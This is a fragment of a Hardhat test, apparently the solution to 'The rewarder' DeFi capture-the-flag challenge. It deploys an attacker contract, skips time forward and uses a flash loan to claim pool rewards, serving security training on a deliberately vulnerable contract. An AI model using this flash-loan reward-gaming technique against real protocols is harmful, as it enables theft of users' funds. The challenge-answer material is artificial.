...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    ...
    const RewarderFlashAttacker = await ethers.getContractFactory(
      "RewarderFlashAttacker"
    );
    const rewarderFlashAttacker = await RewarderFlashAttacker.connect(
      attacker
    ).deploy(
    ...
    // Skip forward 1 round
    await ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 5 + 1]);
    await ethers.provider.send("evm_mine");
    await rewarderFlashAttacker
      .connect(attacker)
      .getFlashLoan(TOKENS_IN_LENDER_POOL);
    await rewarderFlashAttacker.connect(attacker).distributeRewards();
  });
